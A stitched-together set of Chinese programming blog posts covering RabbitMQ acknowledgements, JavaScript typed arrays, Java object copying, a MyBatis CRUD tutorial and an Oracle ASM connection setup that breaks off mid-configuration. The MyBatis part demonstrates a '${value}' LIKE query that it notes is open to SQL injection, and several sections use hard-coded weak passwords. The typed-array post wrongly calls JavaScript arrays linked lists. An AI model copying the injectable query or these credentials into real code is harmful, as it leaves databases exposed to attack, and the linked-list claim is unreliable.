        channel.basicAck(deliveryTag, false);
    }
    @RabbitHandler
    public void receive2(User user, @Header(AmqpHeaders.DELIVERY_TAG)long deliveryTag, Channel channel) throws IOException {
        System.out.println("consumer receive message2: "+user);
　　　　　//如果发生以下情况投递消息所有的通道或连接被突然关闭（包括消费者端丢失TCP连接、消费者应用程序（进程）挂掉、通道级别的协议异常）任何已经投递的消息但是没有被消费者端确认的消息会自动重新排队。
        //请注意，连接检测不可用客户端需要一段时间才会发现，所以会有一段时间内的所有消息会重新投递
        //因为消息的可能重新投递，所有必须保证消费者端的接口的幂等。

        //在RabbitMQ中影响吞吐量最大的参数是：消息确认模式和Qos预取值
        //自动消息确认模式或设置Qos预取值为无限虽然可以最大的提高消息的投递速度，但是在消费者端未及时处理的消息的数量也将增加，从而增加消费者RAM消耗，使用消费者端奔溃。所以以上两种情况需要谨慎使用。
        //RabbitMQ官方推荐Qos预取值设置在 100到300范围内的值通常提供最佳的吞吐量，并且不会有使消费者奔溃的问题
        channel.basicAck(deliveryTag, false);
        channel.basicQos(100);
        // 代表消费者拒绝一条或者多条消息，第二个参数表示一次是否拒绝多条消息，第三个参数表示是否把当前消息重新入队
        // channel.basicNack(deliveryTag, false, false);
        // 代表消费者拒绝当前消息，第二个参数表示是否把当前消息重新入队
        // channel.basicReject(deliveryTag,false);
    }
}

@RabbitListener+@RabbitHandler：消费者监听
　　使用@RabbitListener+@RabbitHandler组合进行监听，监听器会根据队列发来的消息类型自动选择处理方法
channel.basicAck(deliveryTag, false)：手动确认机制
　　deliverTag：该消息的标识，每来一个消息该标识+1
　　multiple：第二个参数标识书否批量确认
　　requeue：被拒绝的是否重新入队
channel.basicQos(100)：最多未确认的消息数量为100，超过100队列将停止给该消费者投递消息
更多参数详解参考https://www.cnblogs.com/piaolingzxh/p/5448927.html
测试


@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestBoot.class)
public class TestRabbit {
    @Resource
    private RbProducer producer;
    @Test
    public void send1() {
        producer.send1("hello,im a string");
    }
    @Test
    public void send2() {
        User user = new User();
        user.setNickname("hello,im a object");
        producer.send2(user);
    }
}

 成功消费


完结
下篇博客我们讨论下在拥有了手动ack机制、confirm机制、return机制后，是否真的可靠~
********************************************************************************************************************************************************************************************************
JavaScript类型化数组（二进制数组）
0、前言
　　对于前端程序员来说，平时很少和二进制数据打交道，所以基本上用不到ArrayBuffer，大家对它很陌生，但是在使用WebGL的时候，ArrayBuffer无处不在。浏览器通过WebGL和显卡进行通信，它们之间会发生大量的、实时的数据交互，对性能的要求特别高，它们之间的数据通信必须是二进制的才能满足性能要求，而不能是传统的文本格式。文本格式传递一个 32 位整数，两端的 JavaScript 脚本与显卡都要进行格式转化，将非常耗时。类型化数组的诞生就是为了能够让开发者通过类型化数组来操作内存，大大增强了JavaScript处理二进制数据的能力。
　　JavaScript类型化数组将实现拆分为缓冲和视图两部分。一个缓冲（ArrayBuffer）描述的是内存中的一段二进制数据，缓冲没有格式可言，并且不提供机制访问其内容。为了访问在缓存对象中包含的内存，你需要使用视图。视图可以将二进制数据转换为实际有类型的数组。一个缓冲可以提供给多个视图进行读取，不同类型的视图读取的内存长度不同，读取出来的数据格式也不同。缓冲和视图的工作方式如下图所示：
　　
1、缓冲（ArrayBuffer）和视图
　　ArrayBuffer是一个构造函数，可以分配一段可以存放数据的连续内存区域。

var buffer = new ArrayBuffer(8);

　　上面代码生成了一段8字节的内存区域，每个字节的值默认都是0。1 字节（Byte） ＝ 8 比特（bit），1比特就是一个二进制位（0 或 1）。上面代码生成的8个字节的内存区域，一共有 8*8=64 比特，每一个二进制位都是0。
　　为了读写这个buffer，我们需要为它指定视图。视图有两种，一种是TypedArray视图，它一共包括9种类型，还有一种是DataView视图，它可以自定义复合类型。 基础用法如下：

var dataView = new DataView(buffer);
dataView.getUint8(0) // 0

var int32View = new Int32Array(buffer);
int32View[0] = 1 // 修改底层内存var uint8View = new Uint8Array(buffer);uint8View[0] // 1




视图类型
说明
字节大小


Uint8Array
8位无符号整数
1字节


Int8Array
8位有符号整数
1字节


Uint8ClampedArray
8位无符号整数（溢出处理不同）
1字节


Uint16Array
16位无符号整数
2字节


Int16Array
16位有符号整数
2字节


Uint32Array
32位无符号整数
4字节


Int32Array
32位有符号整数
4字节


Float32Array
32位IEEE浮点数
4字节


Float64Array
64位IEEE浮点数
8字节



　　下面来看一个完整的例子：

// 创建一个16字节长度的缓冲
var buffer = new ArrayBuffer(16);
// 创建一个视图，此视图把缓冲内的数据格式化为一个32位（4字节）有符号整数数组
var int32View = new Int32Array(buffer);
// 我们可以像普通数组一样访问该数组中的元素
for (var i = 0; i < int32View.length; i++) {
  int32View[i] = i * 2;
}
// 运行完之后 int32View 为[0,2,4,6]
// 创建另一个视图，此视图把缓冲内的数据格式化为一个16位（2字节）有符号整数数组
var int16View = new Int16Array(buffer);

for (var i = 0; i < int16View.length; i++) {
  console.log(int16View[i]);
}
// 打印出来的结果依次是0，0，2，0，4，0，6，0

　　
　　相信图片已经很直观的表达了这段代码的意思。这里应该有人会疑问，为什么2、4、6这三个数字会排在0的前面，这是因为x86的系统都是使用的小端字节序来存储数据的，小端字节序就是在内存中，数据的高位保存在内存的高地址中，数据的低位保存在内存的低地址中。就拿上面这段代码举例，上图中内存大小排列的顺序是从左向右依次变大，int32View[1]对应的4个字节，它填入的值是 10 （2的2进制表示），把0补齐的话就是 00000000 00000000 00000000 00000010（中间的分隔方便观看），计算机会倒过来填充，最终会成为 00000010 00000000 00000000 00000000。与小端字节序对应的就是大端字节序，它就是我们平时读数字的顺序。
2、实际场景
　　在WebGL中有这么一个需求，我要绘制一个带颜色的三角形，这个三角形有三个顶点，每个点有3个坐标和一个RGBA颜色，现在有了三角形的顶点和颜色数据，需要创建一个缓冲，把三角形的数据按顺序填入，然后传输给WebGL。目前的三角形数据是这样的：

      var triangleVertices = [
      // (x,   y,   z)  (r,   g,   b,   a)
        0.0,  0.5, 0.0, 255,   0,   0, 255, // V0
        0.5, -0.5, 0.0,   0, 250,   6, 255, // V1
       -0.5, -0.5, 0.0,   0,   0, 255, 255  // V2
      ];

 
 　　目标格式是一个ArrayBuffer，它的格式是这样的：
 　
　　表示坐标的浮点数是32位的，占4个字节，表示颜色的正整数是8位的，占1个字节，因此我们需要创建两个视图来对这个缓冲进行赋值。

      var triangleVertices = [
      // (x,   y,   z)  (r,   g,   b,   a)
        0.0,  0.5, 0.0, 255,   0,   0, 255, // V0
        0.5, -0.5, 0.0,   0, 250,   6, 255, // V1
       -0.5, -0.5, 0.0,   0,   0, 255, 255  // V2
      ];

      var nbrOfVertices = 3; // 顶点数量
      var vertexSizeInBytes = 3 * Float32Array.BYTES_PER_ELEMENT + 4 * Uint8Array.BYTES_PER_ELEMENT; // 一个顶点所占的字节数 3*4+4*1 ＝ 16

      var buffer = new ArrayBuffer(nbrOfVertices * vertexSizeInBytes); // 3 ＊ 16 = 48 三个顶点一共需要的字节数
      var positionView = new Float32Array(buffer); 
      var colorView = new Uint8Array(buffer);

      var positionOffsetInFloats = 0;
      var colorOffsetInBytes = 12;
      var k = 0;
      // 用三角形数据填充arrayBuffer
      for (var i = 0; i < nbrOfVertices; i++) {
        positionView[positionOffsetInFloats] = triangleVertices[k];         // x
        positionView[1 + positionOffsetInFloats] = triangleVertices[k + 1]; // y
        positionView[2 + positionOffsetInFloats] = triangleVertices[k + 2]; // z
        colorView[colorOffsetInBytes] = triangleVertices[k + 3];            // r
        colorView[1 + colorOffsetInBytes] = triangleVertices[k + 4];            // g
        colorView[2 + colorOffsetInBytes] = triangleVertices[k + 5];            // b
        colorView[3 + colorOffsetInBytes] = triangleVertices[k + 6];            // a

        positionOffsetInFloats += 4; // 4个字节的浮点数循环一次要偏移4位
        colorOffsetInBytes += 16;    // 1个字节的整数循环一次要偏移16位
        k += 7;                      // 原数组一次处理七个数值(三个坐标四个颜色)
      }

 
 　　这段代码运行完，就可以得到我们想要的ArrayBuffer。希望大家可以在浏览器控制台运行一下，然后看看positionView和colorView里面的数据验证一下。细心的小伙伴会发现，如果使用positionView访问颜色数据，或者colorView访问位置数据，得到的数据是“奇怪”的，不知道原因的读者朋友可以去了解一下原码、补码、IEEE浮点数相关的知识。
3、总结
　　类型化数组的内容还有很多，在这里我只重点介绍了一下缓冲和视图是如何一起合作来管理内存的。
　　类型化数组的出现最大的作用就是提升了数组的性能，js中Array的内部实现是链表，可以动态增大减少元素，但是元素多的话，性能会比较差，类型化数组管理的是连续内存区域，知道了这块内存的起始位置，可以通过起始位置＋N * 偏移量（一次加法一次乘法操作）访问到第N个位置的元素，而Array的话就需要通过链表一个一个的找下去。
　　类型化数组的使用场景并不多，可以说是为WebGL量身定做的，不过还是希望你能在以后遇到大量数据的场景能够想起来JS的类型化数组这个功能。
 
 
********************************************************************************************************************************************************************************************************
java提高（15）---java深浅拷贝
#java深浅拷贝
 一、前言
为什么会有深浅拷贝这个概念?
我觉得主要跟JVM内存分配有关,对于基本数据类型,只存在栈内存,所以它的拷贝不存在深浅拷贝这个概念。而对于对象而言,一个对象的创建会在内存中分配两块空间,一个在栈内存存对象的引用指针,一个在堆内存存放对象。这个时候会有一个问题，你拷贝的只是这个引用指针还是拷贝两块内存一起拷贝,这个时候就会有深浅拷贝一说。
还有之前我认为Arrays.copyOf()是深度拷贝,亲测后发现原来它也是浅拷贝。下面进行具体说明。

 二、数据类型
数据分为基本数据类型(int, boolean, double, byte, char等)和对象数据类型。
基本数据类型的特点：直接存储在栈(stack)中的数据.
引用数据类型的特点：在栈内存存储对象引用，真实的数据存放在堆内存里
引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。


 三、什么是浅拷贝和深拷贝
首先需要明白，深拷贝和浅拷贝是只针对Object和Array这样的引用数据类型的。那先来看看浅拷贝和深拷贝的概念。
在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 =号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去，他们实际上还是指向的同一个对象。
浅拷贝：如果在拷贝这个对象的时候，只对基本数据类型进行了拷贝，而对引用数据类型只是进行了引用的传递，而没有真实的创建一个新的对象。
深拷贝：在对引用数据类型进行拷贝的时候，创建了一个新的对象，并且复制其内的成员变量。
深拷贝和浅拷贝的示意图大致如下：


具体接下来代码演示。

 四、代码演示
1、浅拷贝
Person
public class Person {
    public String name;
    public Integer age;
    public String sex;
    /**
     * 提供get和set方法和全参构造函数
     */
}
Test
    public static void main(String[] args) throws Exception {
        Person person = new Person("小小",3,"女");
        //将person值赋值给person1
        Person person1 = person;
        System.out.println(person);
        System.out.println(person1);
        person1.setName("小小她爸");
        System.out.println("person 中 name为："+person.getName());
        System.out.println("person1 中 name为："+person.getName());
    }
查看运行结果

从图片中我们可以很明显看出,它们指向的内存地址是一致的,同样我改变person1的属性值时发现person的属性值也改变了。
说明：对于对象用"=" 赋值 其实只是引用指针的复制,这两个引用还是指向同一个对象。
2、深拷贝
如果要实现深拷贝就会比较复杂点
Student
/**
 * 如果对象要实现深拷贝 那么实体需要做两步
 * 1、实体实现Cloneable接口
 * 2、重写 clone()方法
 */
public class Student implements Cloneable {

    public String name;
    public Integer age;
    public String sex;
    //这也是个实体
    public Address address;
    /**
     * 提供get和set方法和全参构造函数
     */
    @Override
    protected Object clone() throws CloneNotSupportedException {
        return super.clone();
    }
}
Test
    public static void main(String[] args) throws Exception {
        Student student = new Student("小小", 3, "女", null);
        //将person值赋值给person1
        Student student1 = (Student) student.clone();
        System.out.println(student);
        System.out.println(student1);
        student1.setName("小小她爸");
        System.out.println("person 中 name为：" + student.getName());
        System.out.println("person1 中 name为：" + student1.getName());
        }

这里可以已经是两个不同的对象了。但是这里需要注意的是,如果对象中含有对象,这个对象还是浅拷贝。
Address
public class Address  {
    public String  city;
    public  int phone;
    /**
     * 提供get和set方法和全参构造函数
     */
    }
Test
    public static void main(String[] args) throws Exception {
        Address address = new Address("杭州", 1888888888);
        Student student2 = new Student("小小", 3, "女", address);
        //将person值赋值给person1
        Student student3 = (Student) student2.clone();
        address.setCity("北京天安门");
        System.out.println("person2 中 city为：" + student2.getAddress().getCity());
        System.out.println("person3 中 city为：" + student3.getAddress().getCity());

    }

我们发现虽然Student是实现了深拷贝，但Address却还是浅拷贝,那如何让Adress也实现深拷贝呢。
Address修改
public class Address implements Cloneable {
    public String  city;
    public  int phone;
   /**
     * 提供get和set方法和全参构造函数
     */
    @Override
    protected Object clone() throws CloneNotSupportedException {
        return super.clone();
    }
Student修改
 //修改clone方法
   @Override
    protected Object clone() throws CloneNotSupportedException {
        Student s = (Student) super.clone();
        s.address = (Address) address.clone();
        return s;
    }

弊端: 这里我们Person 类只有一个 Address 引用类型，而 Address 类没有，所以我们只用重写 Address 类的clone 方法，但是如果 Address 类也存在一个引用类型，
那么我们也要重写其clone 方法，这样下去，有多少个引用类型，我们就要重写多少次，如果存在很多引用类型，那么代码量显然会很大，所以这种方法不太合适。
所以还有另一种实现深拷贝方法。
序列化实现深拷贝
//序列化实现深拷贝
public Object deepClone() throws Exception{
    // 序列化
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(bos);
    oos.writeObject(this);
    // 反序列化
    ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
    ObjectInputStream ois = new ObjectInputStream(bis);
    return ois.readObject();
}
　//因为序列化产生的是两个完全独立的对象，所有无论嵌套多少个引用类型，序列化都是能实现深拷贝的。

五、Arrays.copyOf() 
之前我误以为Arrays.copyOf()为深拷贝,那只是因为我用的是基本数据类型作为数组,而基本数据类型上面已经说过它没有深浅拷贝这个概念，可以把他理解成只有深拷贝。
 public static void main(String[] args) {

        //1、基本数据类型
        int[] a = {0, 1, 2, 3};
        // Arrays.copyOf拷贝
        int[] copy = Arrays.copyOf(a, a.length);
        a[0] = 1;
        System.out.println(Arrays.toString(copy));
        System.out.println(Arrays.toString(a));

        //2、对象数组
        Student[]  stuArr = {new Student("小小", 3, "女"),new Student("小小爸", 29, "男"),new Student("小小妈", 27, "女")};
        // Arrays.copyOf拷贝
        Student[] copyStuArr = Arrays.copyOf(stuArr, stuArr.length);
        copyStuArr[0].setName("小小爷爷");
        System.out.println(Arrays.toString(stuArr));
        System.out.println(Arrays.toString(copyStuArr));
        

    }

运行结果：

可以明显看出,对于基本数据类型只有深拷贝,而对于数组对象而言,明显存在深浅拷贝,而且可以看出Arrays.copyOf()为浅拷贝。

只要自己变优秀了，其他的事情才会跟着好起来（少将2）

********************************************************************************************************************************************************************************************************
mybatis之旅第一篇-初识mybatis
一、JDBC的问题
为什么我们要使用mybatis，是因为JDBC存在以下问题
1、 数据库连接创建、释放频繁造成系统资源浪费，从而影响系统性能。如果使用数据库连接池可解决此问题。
2、 Sql语句在代码中硬编码，造成代码不易维护，实际应用中sql变化的可能较大，sql变动需要改变java代码。
3、 使用preparedStatement向占有位符号传参数存在硬编码，因为sql语句的where条件不一定，可能多也可能少，修改sql还要修改代码，系统不易维护。
4、 对结果集解析存在硬编码（查询列名），sql变化导致解析代码变化，系统不易维护，如果能将数据库记录封装成pojo对象解析比较方便。
二、mybatis介绍
MyBatis 本是apache的一个开源项目iBatis, 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis 。2013年11月迁移到Github。
MyBatis是一个优秀的持久层框架，它对jdbc的操作数据库的过程进行封装，使开发者只需要关注 SQL 本身，而不需要花费精力去处理例如注册驱动、创建connection、创建statement、手动设置参数、结果集检索等jdbc繁杂的过程代码。
Mybatis通过xml或注解的方式将要执行的各种statement（statement、preparedStatemnt、CallableStatement）配置起来，并通过java对象和statement中的sql进行映射生成最终执行的sql语句，最后由mybatis框架执行sql并将结果映射成java对象并返回。​
三、Mybatis架构



 mybatis配置


          SqlMapConfig.xml，此文件作为mybatis的全局配置文件，配置了mybatis的运行环境等信息。mapper.xml 文件即sql映射文件，文件中配置了操作数据库的sql语句。此文件需要在SqlMapConfig.xml中加载。


通过mybatis环境等配置信息构造SqlSessionFactory即会话工厂


由会话工厂创建sqlSession即会话，操作数据库需要通过sqlSession进行。


mybatis底层自定义了Executor执行器接口操作数据库，Executor接口有两个实现，一个是基本执行器、一个是缓存执行器。


Mapped Statement也是mybatis一个底层封装对象，它包装了mybatis配置信息及sql映射信息等。mapper.xml文件中一个sql对应一个Mapped Statement对象，sql的id即是Mapped statement的id


Mapped Statement对sql执行输入参数进行定义，包括HashMap、基本类型、pojo，Executor通过Mapped Statement在执行sql前将输入的java对象映射至sql中，输入参数映射就是jdbc编程中对preparedStatement设置参数。


Mapped Statement对sql执行输出结果进行定义，包括HashMap、基本类型、pojo，Executor通过Mapped Statement在执行sql后将输出结果映射至java对象中，输出结果映射过程相当于jdbc编程中对结果的解析处理过程。
四、入门程序
使用mybatis进行简单的增删改查能够让我们先有个大体感受，话不多说，开始撸代码
第一步：新建一个maven项目

增加依赖，POM文件内容：

<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.yuanqinnan</groupId>
  <artifactId>mybatis-first</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>mybatis-first</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.7</maven.compiler.source>
    <maven.compiler.target>1.7</maven.compiler.target>
  </properties>
  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.mybatis</groupId>
      <artifactId>mybatis</artifactId>
      <version>3.4.1</version>
    </dependency>
    <dependency>
      <groupId>mysql</groupId>
      <artifactId>mysql-connector-java</artifactId>
      <version>6.0.6</version>
    </dependency>
    <dependency>
      <groupId>log4j</groupId>
      <artifactId>log4j</artifactId>
      <version>1.2.17</version>
    </dependency>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-log4j12</artifactId>
      <version>1.7.25</version>
    </dependency>
  </dependencies>

</project>

第二步：添加配置文件
创建资源文件夹config，SqlMapConfig.xml配置文件，暂且不管在config下创建SqlMapConfig.xml，如下：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!-- 和spring整合后 environments配置将废除 -->
    <environments default="development">
        <environment id="development">
            <!-- 使用jdbc事务管理 -->
            <transactionManager type="JDBC" />
            <!-- 数据库连接池 -->
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.jdbc.Driver" />
                <property name="url"
                          value="jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf-8" />
                <property name="username" value="root" />
                <property name="password" value="123456" />
            </dataSource>
        </environment>
    </environments>
</configuration>

第三步：创建数据库并新建实体
创建脚本：

CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL COMMENT '用户名称',
  `birthday` date DEFAULT NULL COMMENT '生日',
  `sex` char(1) DEFAULT NULL COMMENT '性别',
  `address` varchar(256) DEFAULT NULL COMMENT '地址',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES ('1', '王五', null, '2', null);
INSERT INTO `user` VALUES ('10', '张三', '2014-07-10', '1', '北京市');
INSERT INTO `user` VALUES ('16', '张小明', null, '1', '河南郑州');
INSERT INTO `user` VALUES ('22', '陈小明', null, '1', '河南郑州');
INSERT INTO `user` VALUES ('24', '张三丰', null, '1', '河南郑州');
INSERT INTO `user` VALUES ('25', '陈小明', null, '1', '河南郑州');
INSERT INTO `user` VALUES ('26', '王五', null, null, null);

实体：

public class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private Integer id;
    private String username;// 用户姓名
    private String sex;// 性别
    private Date birthday;// 生日
    private String address;// 地址


    public Integer getId() {
        return id;
    }
    public void setId(Integer id) {
        this.id = id;
    }
    public String getUsername() {
        return username;
    }
    public void setUsername(String username) {
        this.username = username;
    }
    public String getSex() {
        return sex;
    }
    public void setSex(String sex) {
        this.sex = sex;
    }
    public Date getBirthday() {
        return birthday;
    }
    public void setBirthday(Date birthday) {
        this.birthday = birthday;
    }
    public String getAddress() {
        return address;
    }
    public void setAddress(String address) {
        this.address = address;
    }
    @Override
    public String toString() {
        return "User [id=" + id + ", username=" + username + ", sex=" + sex
                + ", birthday=" + birthday + ", address=" + address + "]";
    }
}

第四步：sql映射文件
先新增一个查询方法

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<!-- namespace：命名空间，用于隔离sql，还有一个很重要的作用，后面会讲 -->
<mapper namespace="test">
<select id="queryUserById" parameterType="int" resultType="com.yuanqinnan.model.User">
    SELECT * FROM `user`where id=#{id}
</select>
</mapper>

第五步：加载映射文件
在SqlMapConfig.xml中增加代码段

<mappers>
    <!-- 映射文件方式1，一个一个的配置-->
    <mapper resource="config/sqlmap/User.xml"/>
</mappers>

整体结构如下：

第六步：测试

public class CRUDTest {
    //定义 SqlSession
    SqlSession session =null;

    @Before
    public void init(){
        //定义mybatis全局配置文件
        String resource = "config/SqlMapConfig.xml";
        //加载 mybatis 全局配置文件
        InputStream inputStream = CRUDTest.class.getClassLoader()
                .getResourceAsStream(resource);
        //构建sqlSession的工厂
        SqlSessionFactory sessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        //根据 sqlSessionFactory 产生 session
        session = sessionFactory.openSession();
    }

    //根据id查询user表数据
    @Test
    public void testSelectUserById(){
        String statement = "queryUserById";
        User user = session.selectOne(statement, 1);
        System.out.println(user);
        session.close();
    }
}

测试结果：User [id=1, username=王五, sex=2, birthday=null, address=null]
至此，mybatis的功能已经实现，我们按照此例继续其他的操作
五、其他操作
5.1查询列表
user.xml 增加查询

<!-- 查询 user 表的所有数据-->
<select id="selectUserAll" resultType="com.yuanqinnan.model.User">
    select * from user
</select>

测试：

//查询所有user表所有数据
@Test
public void testSelectUserAll(){
    String statement = "selectUserAll";
    List<User> listUser = session.selectList(statement);
    for(User user : listUser){
        System.out.println(user);
    }
    session.close();
}

结果：

5.2模糊查询(用${}实现)

  <!--
            1、${value}里面必须要写value，不然会报错
            2、${}表示拼接 sql 字符串，将接收到的参数不加任何修饰拼接在sql语句中
            3、使用${}会造成 sql 注入
    -->
    <select id="selectLikeUserName" resultType="com.yuanqinnan.model.User" parameterType="String">
        select * from user where username like '%${value}%'
        <!-- select * from user where username like #{username} -->
    </select>

测试：

//模糊查询：根据 user 表的username字段(用${}实现)
@Test
public void testSelectLikeUserName(){
    String statement = "selectLikeUserName";
    List<User> listUser = session.selectList(statement, "三");
    for(User user : listUser){
        System.out.println(user);
    }
    session.close();

}

结果：

5.3 模糊查询(用#{}实现)

<!--#{}实现-->
<select id="selectLikeUserName2" resultType="com.yuanqinnan.model.User" parameterType="String">
    select * from user where username like #{username}
</select>

测试：

//模糊查询：根据 user 表的username字段(用#{}实现)
@Test
public void testSelectLikeUserName2(){
    String statement = "selectLikeUserName2";
    List<User> listUser = session.selectList(statement, "%三%");
    for(User user : listUser){
        System.out.println(user);
    }
    session.close();

}

结果与上面相同
5.4 新增用户

<!-- 向 user 表插入一条数据 -->
<insert id="insertUser" parameterType="com.yuanqinnan.model.User">
    insert into user(id,username,sex,birthday,address)
        value(#{id},#{username},#{sex},#{birthday},#{address})
</insert>

测试：

//向 user 表中插入一条数据
@Test
public void testInsertUser(){
    String statement = "insertUser";
    User user = new User();
    user.setUsername("袁帅");
    user.setSex("1");
    session.insert(statement, user);
    //提交插入的数据
    session.commit();
    session.close();
}

结果：

如果我们想要返回当前新增的ID，则需要先获取自增ID

<!-- 保存用户 -->
<insert id="saveUser" parameterType="com.yuanqinnan.model.User">
    <!-- selectKey 标签实现主键返回 -->
    <!-- keyColumn:主键对应的表中的哪一列 -->
    <!-- keyProperty：主键对应的pojo中的哪一个属性 -->
    <!-- order：设置在执行insert语句前执行查询id的sql，在执行insert语句之后执行查询id的sql -->
    <!-- resultType：设置返回的id的类型 -->
    <selectKey keyColumn="id" keyProperty="id" order="AFTER"
               resultType="int">
        SELECT LAST_INSERT_ID()
    </selectKey>
    INSERT INTO `user`
    (username,birthday,sex,address) VALUES
    (#{username},#{birthday},#{sex},#{address})
</insert>

测试：

@Test
public void testInsertUser2(){
    String statement = "saveUser";
    User user = new User();
    user.setUsername("袁大帅");
    user.setSex("1");
    session.insert(statement, user);
    System.out.println(user);
    //提交插入的数据
    session.commit();
    session.close();
}

结果：User [id=29, username=袁大帅, sex=1, birthday=null, address=null]
5.5 更新用户

<!-- 根据 id 更新 user 表的数据 -->
<update id="updateUserById" parameterType="com.yuanqinnan.model.User">
    update user set username=#{username} where id=#{id}
</update>

测试：

//根据 id 更新 user 表的数据
@Test
public void testUpdateUserById(){
    String statement = "updateUserById";
    //如果设置的 id不存在，那么数据库没有数据更改
    User user = new User();
    user.setId(29);
    user.setUsername("袁不帅");
    session.update(statement, user);
    session.commit();
    session.close();
}

结果：

5.6 删除用户

<!-- 根据 id 删除 user 表的数据 -->
<delete id="deleteUserById" parameterType="int">
    delete from user where id=#{id}
</delete>

测试：

//根据 id 删除 user 表的数据
@Test
public void testDeleteUserById(){
    String statement = "deleteUserById";
    session.delete(statement,29);
    session.commit();
    session.close();
}

结果：删除成功
6 总结
#{}和${}
#{}表示一个占位符号，通过#{}可以实现preparedStatement向占位符中设置值，自动进行java类型和jdbc类型转换。#{}可以有效防止sql注入。 #{}可以接收简单类型值或pojo属性值。 如果parameterType传输单个简单类型值，#{}括号中可以是value或其它名称。
 表示拼接串，通过{}可以将parameterType 传入的内容拼接在sql中且不进行jdbc类型转换， 可以接收简单类型值或属性值，如果传输单个简单类型值，{}括号中只能是value。
 parameterType和resultType
parameterType：指定输入参数类型，mybatis通过ognl从输入对象中获取参数值拼接在sql中。
resultType：指定输出结果类型，mybatis将sql查询结果的一行记录数据映射为resultType指定类型的对象。如果有多条数据，则分别进行映射，并把对象放到容器List中
 selectOne和selectList
selectOne查询一条记录，如果使用selectOne查询多条记录则抛出异常：
org.apache.ibatis.exceptions.TooManyResultsException: Expected one result (or null) to be returned by selectOne(), but found: 3
at org.apache.ibatis.session.defaults.DefaultSqlSession.selectOne(DefaultSqlSession.java:70)
selectList可以查询一条或多条记录。
Mybatis解决jdbc编程的问题
1、 数据库连接创建、释放频繁造成系统资源浪费从而影响系统性能，如果使用数据库连接池可解决此问题。
解决：在SqlMapConfig.xml中配置数据连接池，使用连接池管理数据库链接。
2、 Sql语句写在代码中造成代码不易维护，实际应用sql变化的可能较大，sql变动需要改变java代码。
解决：将Sql语句配置在XXXXmapper.xml文件中与java代码分离。
3、 向sql语句传参数麻烦，因为sql语句的where条件不一定，可能多也可能少，占位符需要和参数一一对应。
解决：Mybatis自动将java对象映射至sql语句，通过statement中的parameterType定义输入参数的类型。
4、 对结果集解析麻烦，sql变化导致解析代码变化，且解析前需要遍历，如果能将数据库记录封装成pojo对象解析比较方便。
解决：Mybatis自动将sql执行
mybatis与hibernate不同
Mybatis和hibernate不同，它不完全是一个ORM框架，因为MyBatis需要程序员自己编写Sql语句。mybatis可以通过XML或注解方式灵活配置要运行的sql语句，并将java对象和sql语句映射生成最终执行的sql，最后将sql执行的结果再映射生成java对象。
Mybatis学习门槛低，简单易学，程序员直接编写原生态sql，可严格控制sql执行性能，灵活度高，非常适合对关系数据模型要求不高的软件开发，例如互联网软件、企业运营类软件等，因为这类软件需求变化频繁，一但需求变化要求成果输出迅速。但是灵活的前提是mybatis无法做到数据库无关性，如果需要实现支持多种数据库的软件则需要自定义多套sql映射文件，工作量大。
Hibernate对象/关系映射能力强，数据库无关性好，对于关系模型要求高的软件（例如需求固定的定制化软件）如果用hibernate开发可以节省很多代码，提高效率。但是Hibernate的学习门槛高，要精通门槛更高，而且怎么设计O/R映射，在性能和对象模型之间如何权衡，以及怎样用好Hibernate需要具有很强的经验和能力才行。
总之，按照用户的需求在有限的资源环境下只要能做出维护性、扩展性良好的软件架构都是好架构，所以框架只有适合才是最好。
 
********************************************************************************************************************************************************************************************************
测试客户端连接12c ASM实例
环境：Oracle 12.2.0.1 RAC
背景：用户反映12c ASM创建的用户具备sysasm权限，但无法在客户端连接到ASM实例，且没有报错。

1.ASM实例创建用户赋予sysasm权限
2.客户端tnsnames.ora配置
3.客户端测试连接

1.ASM实例创建用户赋予sysasm权限
sqlplus / as sysasm
SQL> create user infa identified by infa;
User created.
SQL> grant sysasm to infa;
Grant succeeded.
2.客户端tnsnames.ora配置
分别针对ASM实例1和实例2配置对应的信息：
ASM12c1 =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.1.90)(PORT = 1521))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = +ASM)
      (INSTANCE_NAME = +ASM1)
    )
  )
  
ASM12c2 =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.1.92)(PORT = 1521))
    (CONNECT_DATA =
